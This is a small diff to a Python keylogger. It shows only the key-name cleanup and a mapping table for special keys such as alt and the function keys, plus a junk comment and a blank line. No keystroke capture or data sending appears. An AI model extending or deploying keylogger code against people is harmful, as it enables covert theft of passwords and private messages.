@@ -14,7 +14,7 @@ def add_list(key):
 
 def keylogger(key):
     key = str(key).replace("'", "")
-    if str('Key') in key:
+    if str('Key') in key: #מjjgyggg
         key.replace('Key.'," ")
     keys_dict = {
         "Key.alt": "(*alt*)",
@@ -39,6 +39,7 @@ def keylogger(key):
         "Key.f3": "(*f3*)",
         "Key.f4": "(*f4*)",
         "Key.f5": "(*f5*)",
+
         "Key.f6": "(*f6*)",
         "Key.f7": "(*f7*)",
         "Key.f8": "(*f8*)",
